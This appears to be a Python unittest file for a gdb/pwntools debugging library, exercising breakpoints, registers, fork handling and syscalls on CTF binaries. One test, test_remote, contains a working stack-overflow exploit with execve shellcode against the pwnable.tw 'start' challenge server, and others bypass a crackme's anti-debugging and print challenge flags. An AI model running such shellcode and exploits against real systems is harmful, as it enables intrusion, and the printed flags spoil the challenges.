import unittest
from gdb_plus import *
import warnings

gdbinit = """
handle SIGALRM nopass
source ~/.gdbinit-gef.py
"""

#@unittest.skip
class Debugger_process(unittest.TestCase):
	def setUp(self):
		warnings.simplefilter("ignore", ResourceWarning)
		self.debuggers = []

	def tearDown(self):
		for dbg in self.debuggers:
			try:
				dbg.close()
			except:
				pass
		pass

	#@unittest.skip
	def test_file_standard(self):
		print("\ntest_file_standard: ", end="")
		with context.local(arch="i386", bits=32):
			dbg = Debugger("./start").remote("chall.pwnable.tw", 10000)
			self.debuggers.append(dbg)
			dbg.c(wait=False)
			self.assertEqual(dbg.recv(), b"Let's start the CTF:")
			dbg.interrupt()
			self.assertEqual(dbg.instruction_pointer - dbg.elf.address, 0x99)
			dbg.close()
	
	#@unittest.skip
	def test_noptrace(self):
		print("\ntest_noptrace: ", end="")
		with context.local(noptrace = True, arch="i386", bits=32):
			dbg = Debugger("./start").remote("chall.pwnable.tw", 10000)
			self.debuggers.append(dbg)
			self.assertEqual(dbg.recv(), b"Let's start the CTF:")
			self.assertFalse(dbg.gdb) 
			dbg.close()

	#@unittest.skip
	def test_remote(self):
		print("\ntest_remote: ", end="")
		with context.local(arch="i386", bits=32):
			args.REMOTE = True
			dbg = Debugger("./start").remote("chall.pwnable.tw", 10000)
			self.debuggers.append(dbg)
			shellcode = b"\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xC9\x31\xD2\xcd\x80"
			dbg.p.recv()
			dbg.p.send(b"\x90" * 0x14 + p32(0x804808b))
			dbg.p.recv(0x18)
			leak = unpack(dbg.p.recv(4))
			offset = 0xffb49d00 - 0xffb49ce4
			stack = leak - offset
			dbg.p.recv()
			dbg.p.send(shellcode.ljust(0x2c, b'\x90') + p32(stack))
			dbg.p.sendline(b"cat /home/start/flag")
			self.assertEqual(dbg.p.recv().strip(), b"FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}")
			dbg.close()
			args.REMOTE = ""

	#@unittest.skip
	def test_process(self):
		print("\ntest_process: ", end="")
		with context.local(arch="i386", bits=32):
			p = process("./start")
			dbg = Debugger(p)
			self.debuggers.append(dbg)
			self.assertEqual(dbg.p.recv(), b"Let's start the CTF:")
			dbg.close()
			p.close()

	#@unittest.skip
	def test_pid(self):
		print("\ntest_pid: ", end="")
		with context.local(arch="i386", bits=32):
			p = process("./start")
			self.assertEqual(type(p.pid), int)
			dbg = Debugger(p.pid, binary="./start")
			self.debuggers.append(dbg)
			dbg.close()
			p.close()

	#@unittest.skip
	def test_debug_from(self):
		print("\ntest_debug_from: ", end="")
		with context.local(arch="amd64", bits=64):
			dbg = Debugger("./traps_withSymbols", aslr=False, debug_from=0x0401590, timeout=0.4)
			self.debuggers.append(dbg)
			self.assertEqual(dbg.rip, 0x0401590)
			dbg.close()

	#@unittest.skip
	def test_nonblocking_debug_from(self):
		print("\ntest_nonblocking_debug_from: ", end="")

		with context.local(arch="i386", bits=32):
			interaction_finished = Event()
			dbg = Debugger("./start", aslr=False).debug_from(0x804809d, event=interaction_finished, timeout=0.01)
			self.debuggers.append(dbg)
			dbg.p.sendline(b"ciao")
			interaction_finished.set()
			dbg.debug_from_done.wait()
			self.assertEqual(dbg.eip, 0x804809d)

#@unittest.skip
class Debugger_actions(unittest.TestCase):
	def setUp(self):
		warnings.simplefilter("ignore", ResourceWarning)
		with context.local(arch="amd64", bits=64):
			self.dbg = Debugger("./insaaaaaaane")

	def tearDown(self):
		self.dbg.close()

	# Fail, ho fatto next a mano e ho perso il controllo
	@unittest.skip
	def test_continue_until(self):
		print("\ntest_continue_until: ", end="")
		self.dbg.b(0x403ad7, temporary=True)
		print("\nPlay with gdb once we hit address 0x403ad7 and then send continue")
		self.dbg.c(until=0x403adb)
		self.assertEqual(self.dbg.instruction_pointer, 0x403adb)

	#@unittest.skip
	def test_nonblocking_continue_until(self):
		print("\ntest_nonblocking_continue_until: ", end="")
		done = self.dbg.continue_until(0x4038c2, wait=False)
		self.dbg.p.sendline(b"ciao")
		done.wait()
		self.assertEqual(self.dbg.instruction_pointer, 0x4038c2)

#@unittest.skip
class Debugger_callbacks(unittest.TestCase):
	def setUp(self):
		warnings.simplefilter("ignore", ResourceWarning)
		self.dbg = Debugger("./insaaaaaaane")

	def tearDown(self):
		self.dbg.close()

	#@unittest.skip
	def test_read_memory(self):
		print("\ntest_read_memory: ", end="")
		
		data = []

		def callback(dbg):
			dbg.push(dbg.rsi)
			data.append(u64(dbg.read(dbg.rsp, 8)) != dbg.rsi)
			dbg.rsi = dbg.pop()
			return True
			
		self.dbg.b(0x400786, callback=callback, temporary=True)
		self.dbg.c(wait=True)

		self.assertFalse(sum(data))

	#@unittest.skip
	def test_no_stop(self):
		print("\ntest_no_stop: ", end="")
		def callback(dbg):
			dbg.b(0x403ad9, temporary=True)
			return False

		self.dbg.b(0x403ad0, callback=callback, temporary=True)
		
		self.dbg.c(wait=True)
		#self.dbg.interactive()
		self.assertEqual(self.dbg.rip, 0x403ad9)
		self.assertFalse(len(self.dbg.breakpoints))

	#@unittest.skip
	def test_step(self):
		print("\ntest_step: ", end="")

		def callback(dbg):
			dbg.step()
			return True

		self.dbg.b(0x403ad0, callback=callback, temporary=True)
		self.dbg.c(wait=True)
		self.assertEqual(self.dbg.rip, 0x403ad2)

	# Ricordati di testare anche finish con callback


#@unittest.skip
class Debugger_memory(unittest.TestCase):
	def setUp(self):
		warnings.simplefilter("ignore", ResourceWarning)
		self.dbg = Debugger("./cube")

	def tearDown(self):
		if hasattr(self, "dbg"):
			self.dbg.close()
		pass

	#@unittest.skip
	def test_register_access(self):
		print("\ntest_register_access: ", end="")
		self.dbg.rax = 0xdeadbeefdeadbeef
		self.dbg.eax = 0xfafafafa
		self.dbg.ax  = 0xbabe
		self.dbg.ah = 0x90
		self.assertEqual(self.dbg.rax, 0xdeadbeeffafa90be)
		self.dbg.r11 = 0x134343432342
		self.assertEqual(self.dbg.r11, 0x134343432342)

	#@unittest.skip
	def test_special_registers(self):
		print("\ntest_special_registers: ", end="")
		self.assertEqual(self.dbg.return_value, self.dbg.rax)
		self.assertEqual(self.dbg.stack_pointer, self.dbg.rsp)
		self.assertEqual(self.dbg.instruction_pointer, self.dbg.rip)

	# TODO: Test it with multiple inferiors if possible
	#@unittest.skip
	def test_alloc(self):
		print("\ntest_alloc: ", end="")
		self.dbg.close()
		self.dbg = Debugger("./cube", aslr=False, from_start=False) # Wait for the libc to be loaded
		pointer = self.dbg.alloc(16)
		self.dbg.write(pointer, p64(0xdeadbeeffafa90be))
		self.assertTrue(hex(pointer) in self.dbg.execute("heap chunks")) # WARNING THIS ONLY WORKS WITH GEF
		self.dbg.dealloc(pointer)
		pointer = self.dbg.alloc(16, heap=False)
		self.dbg.write(pointer, p64(0xdeadbeeffafa90be))
		self.dbg.dealloc(pointer, len=16, heap=False)
		# remember dealloc in the bss will only delete the last chunk... 
		self.dbg.close()
		
#@unittest.skip
class Debbuger_fork(unittest.TestCase):
	from base64 import b64encode
	def setUp(self):
		warnings.simplefilter("ignore", ResourceWarning)
		warnings.simplefilter("ignore", ImportWarning)

	def tearDown(self):
		if hasattr(self, "dbg"):
			self.dbg.close()
		pass

	def http_request(self, *, auth: bytes = b64encode(b"admin:admin"), keepAlive: bool = False):
		LINE_TERMINATOR =  b"\r\n"
		request = []
		request.append(b"GET / HTTP/1.1")
		request.append(b"authorization: Basic " + auth) 
		if keepAlive:
			request.append(b"Connection: keep-alive")
		else:
			request.append(b"Connection: close")
		return LINE_TERMINATOR.join(request + [b""])

	#@unittest.skip
	def test_continuous_follow(self):
		print("\ntest_continuous_follow: ", end="")
		gdbscript = """
		set detach-on-fork off
		set follow-fork-mode child
		"""
		self.dbg = Debugger("./httpd", aslr=False, script=gdbscript)
		CALL_TO_B64DECODE = 0x26d5
		self.dbg.b(CALL_TO_B64DECODE)
		self.dbg.c(wait=False)
		self.dbg.p.sendline(self.http_request(keepAlive=True))
		self.dbg.wait()
		self.assertEqual(self.dbg.rip, 0x5555555566d5)
		self.dbg.c(wait=True)
		self.dbg.execute("inferior 1") # We can't go back while the child is running
		self.dbg.c(wait=False)
		self.dbg.p.sendline(self.http_request(keepAlive=True))
		self.dbg.wait()
		self.assertEqual(self.dbg.rip, 0x5555555566d5)
		self.dbg.close()
	
	#@unittest.skip
	def test_split(self):
		print("\ntest_split: ", end="")
		with context.local(arch = "amd64", bits = 64):
			CALL_TO_B64DECODE = 0x26d5
			gdbscript = """
			set detach-on-fork off
			continue
			"""
			dbg = Debugger("./httpd", aslr=False, script=gdbscript)
			sleep(1) # wait for the child to spwn. The parrent will continue while the child is stopped at fork
			dbg.interrupt()
			dbg.b(CALL_TO_B64DECODE)
			child = dbg.split_child(n=2)
			dbg.p.sendline(self.http_request(keepAlive=True))
			child.b(CALL_TO_B64DECODE)
			child.c(wait=True)
			self.assertEqual(child.rip, 0x5555555566d5)
			child.c()
			child.detach()
			dbg.execute("set follow-fork-mode child")
			dbg.p.sendline(self.http_request(keepAlive=True))
			dbg.c(wait=True)
			self.assertEqual(dbg.rip, 0x5555555566d5)
			dbg.close()
			child.close()

	#@unittest.skip
	def test_my_split(self):
		print("\ntest_my_split: ", end="")
		with context.local(arch = 'amd64'):
			dbg = Debugger("./traps_withSymbols", script="", aslr=False).set_split_on_fork(interrupt=True)
			dbg.c(wait=False)
			pid = dbg.wait_split() # and then for the child to split out
			child = dbg.children[pid]
			self.assertEqual(dbg.instruction_pointer, 0x4327a7) # Will continue without interuptions. Get's there waiting for the PTRACE from the child
			self.assertEqual(child.instruction_pointer, 0x432d37)
			dbg.close()
			child.close()

	# This one fails 1/4 times
	#@unittest.skip
	def test_ptrace_emulation(self):
		print("\ntest_ptrace_emulation: ", end="")
		with context.local(arch = 'amd64'):
			ANTI_DEBUG_TEST_FINISHED = 0x0401590
			RWX_SECTION = 0x7ffff7ff8000
			END_UNPACK  = RWX_SECTION + 0x80
			SYSCALL_TRAP_PTRACE = RWX_SECTION + 0x9e
			dbg = Debugger("./traps_withSymbols", script=gdbinit, aslr=False, debug_from=ANTI_DEBUG_TEST_FINISHED).set_split_on_fork()
			
			dbg.continue_until("fork")
			dbg.finish()
			pid = dbg.wait_split()
			
			second_child = dbg.children[pid]
			second_child.emulate_ptrace_slave(dbg)
			dbg.emulate_ptrace_master(second_child)
			# Continue after fork
			dbg.c(wait=True)
			second_child.c(wait=True)
		
			# handle signal
			dbg.c(wait=True)
			second_child.c(wait=True, force=True)
			
			dbg.p.sendline(b"CSCG{4ND_4LL_0FF_TH1S_W0RK_JU5T_T0_G3T_TH1S_STUUUP1D_FL44G??!!1}")
			for i in range(1, 22):
				if second_child.instruction_pointer == RWX_SECTION + 1:
					# setup unpack
					dbg.c(wait=True)
					second_child.c(until=END_UNPACK)
					if i < 4:
						second_child.c(wait=True)
						continue
					elif i == 4:
						dbg.p.recv() # Just receive the prompt
						# Pass ptrace check
						second_child.c(until=SYSCALL_TRAP_PTRACE)
						second_child.step()
						second_child.return_value = 0x0
					else:
						...
				# Temporary breakpoint to avoid having a \xCC in the dump 
				# Use breakpoint instead of until so I can wait for both the breakpoint and the exit of the process
				second_child.b(END_UNPACK, temporary=True)
				second_child.c(wait=True)
			
			self.assertTrue(b"YES !" in dbg.p.recv())

			second_child.close()
			dbg.close()

#@unittest.skip
class Debugger_signals(unittest.TestCase):
	def setUp(self):
		warnings.simplefilter("ignore", ResourceWarning)
		warnings.simplefilter("ignore", ImportWarning)
		self.dbg = Debugger("./ExceptionalChecking_patched")

	def tearDown(self):
		if hasattr(self, "dbg"):
			self.dbg.close()
		pass
		
	# Commented out to not slow down too much the tests
	#@unittest.skip
	def test_signal_handler(self):
		print("\ntest_signal_handler: ", end="")
		from queue import Queue
		HANDLER_RET = 0x04011ff
		CHECK_CALL = 0x0401341
		self.dbg.p.sendline(b"serial_a_caso")
		self.dbg.cont(until=CHECK_CALL)
		self.dbg.step()
		self.dbg.next_signal = False
		output = []
		def callback(dbg):
			if self.dbg.next_signal:
				#print("\ncall signal")
				self.dbg.signal("SIGUSR1", handler=HANDLER_RET)
				self.dbg.next_signal = False
			ni = self.dbg.next_inst
			if ni.mnemonic == "int3":
				#print("\nint3")
				self.dbg.next_signal = True
				self.dbg.write(self.dbg.instruction_pointer, b"\x90") #Just to avoid problems
			else:
				output.append(ni.toString())
		self.dbg.step_until_ret(callback)
		with open("dump_ExceptionalChecking") as fp:
			self.assertEqual(output, fp.read().split("\n"))

#@unittest.skip
class Debugger_calls(unittest.TestCase):
	def setUp(self):
		warnings.simplefilter("ignore", ResourceWarning)

	def tearDown(self):
		if hasattr(self, "dbg"):
			self.dbg.close()

	#@unittest.skip
	def test_call(self):
		print("\ntest_call: ", end="")
		out = []
		self.dbg = Debugger("./cube", from_start=False, aslr=False) # You must wait for the libc to be loaded to call malloc
		for mossa in [0x00003175, 0x00003e74, 0x000038d9, 0x00001885]:
			# Create blank cube
			pointer = self.dbg.alloc(54*8)
			for i in range(54):
				self.dbg.write(pointer+i*8, p64(i))

			self.dbg.call(mossa, [pointer])
			out.append(f"prossima funzione {hex(self.dbg.get_base_elf() + mossa)}")
			for i in range(54):
				out.append(f"{i}: {u64(self.dbg.read(pointer+i*8, 8))}")
		#print("\n\n".join(out)) 
		with open("./dump_Cube") as fd:
			self.assertEqual(out, fd.read().split("\n"))
		self.dbg.close()

	#@unittest.skip
	def test_syscall_64bit(self):
		print("\ntest_syscall: ", end="")
		path = "./data.txt"
		with context.local(arch="amd64", bits=64):
			with open(path, "wb") as file:
				file.write(b"")
			self.dbg = Debugger("./insaaaaaaane", from_start=False) # You must wait for the libc to be loaded to call malloc
			fd = self.dbg.syscall(constants.SYS_open, [path, constants.O_WRONLY, 0x0])
			data = b"ciao, come stai ?"
			self.dbg.syscall(constants.SYS_write, [fd, data, len(data)])
			self.dbg.syscall(constants.SYS_close, [fd])
			with open(path, "rb") as file:
				self.assertEqual(file.read(), data)

#class Debugger_fancy_gdb(unittest.TestCase):
#
#	def tearDown(self):
#		if hasattr(self, "dbg"):
#			self.dbg.close()
#		pass
#
#	def test_pwndbg(self):
#		gdbinit = """
#		source ~/.gdbinit-pwndbg
#		"""
#		self.dbg = Debugger("./httpd", script=gdbinit, from_start=False)
#		self.dbg.c(wait=False)
#		sleep(1)
#		self.dbg.interrupt() # Non è questo ad ucciderlo anche se printa SIGINT
#		pointer = self.dbg.alloc(16, heap=False)
#		self.dbg.write(pointer, p64(0xdeadbeeffafa90be))
#		pointer = self.dbg.alloc(16)
#		self.dbg.write(pointer, p64(0xdeadbeeffafa90be))
#		self.dbg.close()
#		gdbinit = """
#		source ~/.gdbinit-gef.py
#		"""
#		self.dbg = Debugger("./httpd", script=gdbinit, from_start=False)
#		pointer = self.dbg.alloc(16)
#		self.dbg.write(pointer, p64(0xdeadbeeffafa90be))
#		self.dbg.close()

@unittest.skip
class Debugger_libdebug(unittest.TestCase):
	def setUp(self):
		warnings.simplefilter("ignore", ResourceWarning)

	def tearDown(self):
		self.dbg.close()

	#@unittest.skip
	def test_migrate(self):
		print("\ntest_migrate: ", end="")
		with context.local(arch="amd64", bits=64):
			self.dbg = Debugger("./httpd", aslr=False)
			self.dbg.migrate(libdebug=True)
			self.assertEqual(self.dbg.instruction_pointer, 0x7ffff7fe32b0)
			self.dbg.step()
			self.assertEqual(self.dbg.instruction_pointer, 0x7ffff7fe32b3)
			self.dbg.migrate(gdb=True)
			self.assertEqual(self.dbg.instruction_pointer, 0x7ffff7fe32b3)
			self.dbg.step()
			self.assertEqual(self.dbg.instruction_pointer, 0x7ffff7fe4050)

	#@unittest.skip
	def test_continue_until(self):
		print("\ntest_continue_until [libdebug]: ", end="")
		with context.local(arch="amd64", bits=64):
			self.dbg = Debugger("./httpd", aslr=False)
			self.dbg.migrate(libdebug=True)
			self.dbg.continue_until("main")
			self.assertEqual(self.dbg.instruction_pointer, 0x55555555570c)

	@unittest.skip
	def test_call(self):
		print("\ntest_call [libdebug]: ", end="")
		out = []
		with context.local(arch="amd64", bits=64):
			self.dbg = Debugger("./cube", aslr=False, debug_from=0x55555555950a) # You must wait for the libc to be loaded to call malloc
			self.dbg.migrate(libdebug=True)
			address = self.dbg.call("malloc", [0x100])
			self.assertEqual(address, 0x55555555d2a0)
			
	#@unittest.skip
	def test_callbacks(self):
		print("\ntest_callbacks [libdebug]: ", end="")
		with context.local(arch = 'amd64'):
			ANTI_DEBUG_TEST_FINISHED = 0x0401590
			RWX_SECTION = 0x7ffff7ff8000
			END_UNPACK  = RWX_SECTION + 0x80
			SYSCALL_TRAP_PTRACE = RWX_SECTION + 0x9e
			self.dbg = Debugger("./traps_withSymbols", aslr=False, debug_from=ANTI_DEBUG_TEST_FINISHED).set_split_on_fork()
			
			self.dbg.continue_until("fork")
			self.dbg.finish()
			pid = self.dbg.wait_split()
			
			second_child = self.dbg.children[pid]
			self.dbg.migrate(libdebug=True)
			second_child.emulate_ptrace_slave(self.dbg)
			self.dbg.emulate_ptrace_master(second_child)
			# Continue after fork
			self.dbg.c(wait=True)
			second_child.c(wait=True)
			return
			# handle signal
			self.dbg.c(wait=True)
			second_child.c(wait=True, force=True)
			self.dbg.p.sendline(b"CSCG{4ND_4LL_0FF_TH1S_W0RK_JU5T_T0_G3T_TH1S_STUUUP1D_FL44G??!!1}")
			for i in range(1, 22):
				if second_child.instruction_pointer == RWX_SECTION + 1:
					# setup unpack
					self.dbg.c(wait=True)
					second_child.c(until=END_UNPACK)
					if i < 4:
						second_child.c(wait=True)
						continue
					elif i == 4:
						self.dbg.p.recv() # Just receive the prompt
						# Pass ptrace check
						second_child.c(until=SYSCALL_TRAP_PTRACE)
						second_child.step()
						second_child.return_value = 0x0
					else:
						...
				# Temporary breakpoint to avoid having a \xCC in the dump 
				# Use breakpoint instead of until so I can wait for both the breakpoint and the exit of the process
				second_child.b(END_UNPACK, temporary=True)
				second_child.c(wait=True)
			
			self.assertTrue(b"YES !" in dbg.p.recv())

			second_child.close()

	#@unittest.skip
	def test_inner_debugger(self):	
		print("\ntest_inner_debugger [libdebug]:")	
		from sage.all import IntegerModRing, MatrixSpace, vector

		END_ANTI_TRACING = 0x0401590
		PTRACE_CONT = 0x0401775
		RWX_SECTION = 0x7ffff7ff8000
		END_UNPACK  = RWX_SECTION + 0x80
		TRAP_PTRACE = RWX_SECTION + 0x9e
		MATRIX_DATA = RWX_SECTION + 0xc2

		def parse_line(data: bytes):
		    ans = []
		    for i in range(0, 0x10):
		        ans.append(u32(data[i*4: (i+1)*4]))
		    return ans

		self.dbg = Debugger("./traps_withSymbols", aslr=False, debug_from=END_ANTI_TRACING)
		self.dbg.next()
		child_pid = self.dbg.return_value
		# Wait for parent to attach
		self.dbg.continue_until("waitpid")
		self.dbg.finish()

		self.dbg.migrate(libdebug=True)
		child = Inner_Debugger(self.dbg, child_pid)

		self.dbg.p.sendline(b"A"*0x40)
		A, b = [], []
		for i in range(1, 21):
		    if i <= 4:
		      self.dbg.continue_until(PTRACE_CONT, loop=True)
		    child.continue_until(END_UNPACK, loop=True)
		    if i == 4:
		      child.continue_until(TRAP_PTRACE)
		      child.step()
		      child.return_value = 0x0
		    if i in range(5, 5+0x10):
		      A.append(parse_line(child.read(MATRIX_DATA, 0x40)))
		      b.append(u32(child.read(MATRIX_DATA+ 0x40, 4)))
		R = IntegerModRing(2**32)
		M = MatrixSpace(R, 0x10, 0x10)
		A = M(A)
		b = vector(b)
		x = A.solve_right(b)
		flag = b""
		for n in x:
		    flag += p32(n)
		flag = xor(flag, 0xd)
		self.assertEqual(flag, b"CSCG{4ND_4LL_0FF_TH1S_W0RK_JU5T_T0_G3T_TH1S_STUUUP1D_FL44G??!!1}")

if __name__ == "__main__":
	with context.quiet:
		unittest.main()